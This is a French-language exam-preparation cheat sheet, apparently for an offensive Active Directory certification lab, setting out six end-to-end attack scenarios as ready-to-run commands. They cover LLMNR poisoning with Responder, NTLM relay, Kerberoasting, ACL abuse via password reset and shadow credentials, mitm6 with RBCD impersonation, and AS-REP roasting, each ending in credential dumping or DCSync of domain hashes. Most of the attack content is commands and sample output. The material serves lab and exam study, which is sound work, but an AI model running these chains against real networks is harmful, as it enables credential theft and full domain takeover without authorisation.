# Scénarios types

> Scénarios de bout en bout les plus fréquents en exam. Choisir le scénario qui correspond au chemin identifié.

---

## Scénario 1 — "Épreuve à tiroir" (le classique exam)

**Contexte :** Les flags sont cachés dans les partages SMB. Chaque flag contient des informations pour trouver le suivant.

```
SYSVOL → Flag 1 + credentials → Accès à d'autres machines → Flag 2 → ...
```

### Étapes

**Étape 1 : Obtenir un premier compte (via Responder, Relay, ou Spraying)**

```bash
# Responder
sudo responder -I $IFACE -rdw
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Étape 2 : Explorer SYSVOL immédiatement**

```bash
smbclient //$DC_IP/SYSVOL -U $DOMAIN/$USER%$PWD -c "recurse ON; mget *" 2>/dev/null

# Chercher des flags
grep -r "FLAG\|flag" ~/certif/loot/ 2>/dev/null

# Chercher des cpassword GPP
find ~/certif/loot/ -name "*.xml" | xargs grep -l "cpassword" 2>/dev/null
gpp-decrypt 'CPASSWORD_FOUND'
```

**Étape 3 : Parcourir tous les partages**

```bash
nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN --shares | tee ~/certif/loot/shares.txt

# Pour chaque partage non-standard
for share in $(grep -v "ADMIN\$\|C\$\|SYSVOL\|NETLOGON\|IPC\$" ~/certif/loot/shares.txt | grep "READ\|WRITE" | awk '{print $4}'); do
    echo "=== $share ==="
    smbclient //$DC_IP/$share -U $DOMAIN/$USER%$PWD -c "recurse ON; ls" 2>/dev/null
done
```

**Étape 4 : Tester les credentials trouvés**

```bash
# Chaque nouveau user:password trouvé dans un flag
nxc smb $RANGE -u $FOUND_USER -p $FOUND_PWD -d $DOMAIN --continue-on-success
# Répéter pour chaque tiroir
```

---

## Scénario 2 — Relay NTLM → compte → énumération → DA

**Contexte :** Le réseau a des machines sans signature SMB. On relay vers une machine admin.

```
Responder (LLMNR capture) → ntlmrelayx (relay vers machine vulnérable)
→ Dump SAM → Hash NT local admin → PtH → Machine compromise
→ Dump LSASS → Credentials DA en mémoire → DCSync
```

### Étapes

**Étape 1 : Préparer le relay**

```bash
# Identifier les cibles sans signing
nxc smb $RANGE --gen-relay-list ~/certif/targets_relay.txt
echo "Cibles relay : $(wc -l < ~/certif/targets_relay.txt)"

# Terminal 1 : Responder (SMB/HTTP off)
sudo nano /etc/responder/Responder.conf  # SMB = Off, HTTP = Off
sudo responder -I $IFACE -rdw

# Terminal 2 : ntlmrelayx
ntlmrelayx.py -tf ~/certif/targets_relay.txt -smb2support -socks
```

**Étape 2 : Attendre un relay réussi**

```bash
# Dans ntlmrelayx, taper : socks
# Voir la session active :
# SMB  192.168.X.20  DOMAIN/alice  TRUE  445

# Configurer proxychains
sudo nano /etc/proxychains4.conf  # socks5  127.0.0.1  1080

# Utiliser la session
proxychains -q secretsdump.py $DOMAIN/alice@$RELAYED_TARGET -no-pass
```

**Étape 3 : Avec le hash obtenu, s'étendre**

```bash
export NT_HASH="HASH_FROM_DUMP"

# Tester sur tout le réseau
nxc smb $RANGE -u $USER -H $NT_HASH -d $DOMAIN

# Sur chaque (Pwn3d!) → dump LSASS
nxc smb $PWNED_TARGET -u $USER -H $NT_HASH -d $DOMAIN -M lsassy

# Si session DA en mémoire → DCSync
secretsdump.py -hashes :$DA_HASH $DOMAIN/$DA_USER@$DC_IP -just-dc-ntlm
```

---

## Scénario 3 — Kerberoasting → crack → escalade

**Contexte :** Un compte de service avec SPN a un mot de passe faible. BloodHound montre qu'il mène vers DA.

```
Compte domain user → GetUserSPNs → Hash TGS → Crack → Compte de service
→ BloodHound : svc_sql est dans Server Operators → DCSync possible
```

### Étapes

**Étape 1 : Obtenir un compte de domaine**

```bash
# Via n'importe quelle méthode (Responder, Relay, AS-REP, Spraying)
nxc smb $DC_IP -u $USER -p $PWD -d $DOMAIN  # vérifier
```

**Étape 2 : Kerberoasting**

```bash
GetUserSPNs.py $DOMAIN_FQDN/$USER:$PWD -dc-ip $DC_IP \
    -request -outputfile ~/certif/hashes/kerberoast.hash

# Voir les comptes avec SPN
GetUserSPNs.py $DOMAIN_FQDN/$USER:$PWD -dc-ip $DC_IP
```

**Étape 3 : Cracker**

```bash
hashcat -m 13100 ~/certif/hashes/kerberoast.hash \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# Si pas de résultat avec rockyou, essayer d'autres wordlists
hashcat -m 13100 ~/certif/hashes/kerberoast.hash \
    /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
```

**Étape 4 : Analyser le compte de service dans BloodHound**

```bash
# Charger BloodHound → chercher le compte de service
# Vérifier ses groupes → ses droits → chemin vers DA
```

**Étape 5 : Exploiter selon le chemin BloodHound**

```bash
export SVC_USER="svc_sql"
export SVC_PWD="Service2024!"

# S'il est dans un groupe privilégié
nxc smb $DC_IP -u $SVC_USER -p $SVC_PWD -d $DOMAIN  # (Pwn3d!) ?

# Si droits DCSync
secretsdump.py $DOMAIN/$SVC_USER:'$SVC_PWD'@$DC_IP -just-dc-ntlm
```

---

## Scénario 4 — BloodHound → chemin ACL → DA

**Contexte :** BloodHound identifie un chemin ACL : ton compte → GenericWrite → compte B → membre de Domain Admins.

```
alice --[GenericWrite]--> svc_backup --[MemberOf]--> Domain Admins
```

### Étapes

**Étape 1 : Identifier le chemin dans BloodHound**

```bash
# Analysis → "Find Shortest Paths to Domain Admins"
# Exemple de chemin :
# alice --GenericWrite--> svc_backup --MemberOf--> Domain Admins
```

**Étape 2 : Exploiter GenericWrite**

Option A — Reset du mot de passe :

```bash
bloodyAD -u alice -p 'AlicePwd' -d $DOMAIN --dc-ip $DC_IP \
    set password svc_backup 'Pwn3d2024!'

nxc smb $DC_IP -u svc_backup -p 'Pwn3d2024!' -d $DOMAIN
```

Option B — Shadow Credentials (sans reset visible) :

```bash
certipy shadow auto \
    -u "alice@$DOMAIN_FQDN" -p 'AlicePwd' \
    -account svc_backup \
    -dc-ip $DC_IP

# → Donne un TGT + hash NT pour svc_backup
```

Option C — Targeted Kerberoasting (ajouter SPN) :

```bash
targetedKerberoast.py -d $DOMAIN_FQDN -u alice -p 'AlicePwd' \
    --dc-ip $DC_IP
hashcat -m 13100 targeted.hash /usr/share/wordlists/rockyou.txt
```

**Étape 3 : Se connecter avec le compte obtenu**

```bash
export PRIV_USER="svc_backup"
export PRIV_PWD="Pwn3d2024!"

nxc smb $DC_IP -u $PRIV_USER -p $PRIV_PWD -d $DOMAIN
# Si (Pwn3d!) → DCSync immédiatement

secretsdump.py $DOMAIN/$PRIV_USER:'$PRIV_PWD'@$DC_IP -just-dc-ntlm
```

---

## Scénario 5 — MITMv6 → RBCD → impersonation DA

**Contexte :** IPv6 actif sur le réseau, pas de DHCPv6. On crée un compte machine et on configure RBCD.

```
mitm6 → ntlmrelayx (LDAPS) → compte EVIL$ créé + RBCD configuré
→ getST.py → impersonation Administrator → accès CIFS sur la cible
```

### Étapes

```bash
# Terminal 1 : mitm6
sudo mitm6 -d $DOMAIN_FQDN -i $IFACE

# Terminal 2 : ntlmrelayx
ntlmrelayx.py -6 -t ldaps://$DC_IP \
    --delegate-access --add-computer

# Attendre la capture et la création du compte machine
# → [+] EVIL$ created with password EvilPass123!
# → [+] Delegation rights set for EVIL$

# Utiliser RBCD
getST.py -spn 'cifs/target.entreprise.local' \
         -impersonate Administrator \
         $DOMAIN/EVIL\$:'EvilPass123!'

export KRB5CCNAME=$PWD/Administrator.ccache
psexec.py -k -no-pass target.entreprise.local

# Une fois sur la cible : dump credentials
secretsdump.py -k -no-pass $DOMAIN/Administrator@target.entreprise.local
```

---

## Scénario 6 — AS-REP Roasting pur (sans credentials)

**Contexte :** Pas de credentials de départ. Un compte a la pré-auth désactivée.

```
Énumération users (RID brute) → AS-REP Roasting → Crack → Premier compte
→ BloodHound → chemin vers DA
```

### Étapes

```bash
# Étape 1 : Obtenir des usernames
nxc smb $DC_IP -u '' -p '' --rid-brute 5000 2>/dev/null \
    | grep SidTypeUser \
    | awk -F'\' '{print $NF}' | cut -d' ' -f1 \
    > ~/certif/users.txt

# Étape 2 : AS-REP Roasting
GetNPUsers.py $DOMAIN_FQDN/ -no-pass \
    -usersfile ~/certif/users.txt \
    -dc-ip $DC_IP \
    -outputfile ~/certif/hashes/asrep.hash

# Étape 3 : Crack
hashcat -m 18200 ~/certif/hashes/asrep.hash \
    /usr/share/wordlists/rockyou.txt

# Étape 4 : Valider et continuer
export USER="comptetrouv"
export PWD="MotDePasseCracke"
nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN --continue-on-success

# Étape 5 : BloodHound + énumération normale
bloodhound-python -u $USER -p $PWD -d $DOMAIN_FQDN -ns $DC_IP -c All --zip
```

---

## Tableau récapitulatif des scénarios

| Scénario | Vecteur initial | Technique clé | Phase la plus critique |
|----------|----------------|--------------|----------------------|
| Épreuve tiroir | Responder / Relay | Exploration SMB | Phase 4 — chasse flags |
| Relay NTLM | Relay SMB | ntlmrelayx SOCKS | Phase 2 — relay |
| Kerberoasting | Compte basique | GetUserSPNs + hashcat | Phase 4 — crack |
| ACL Abuse | BloodHound | bloodyAD / certipy shadow | Phase 5 — lecture BH |
| MITMv6 RBCD | IPv6 | mitm6 + ntlmrelayx + getST | Phase 2 — setup |
| AS-REP pur | RID brute | GetNPUsers sans auth | Phase 2 — sans compte |
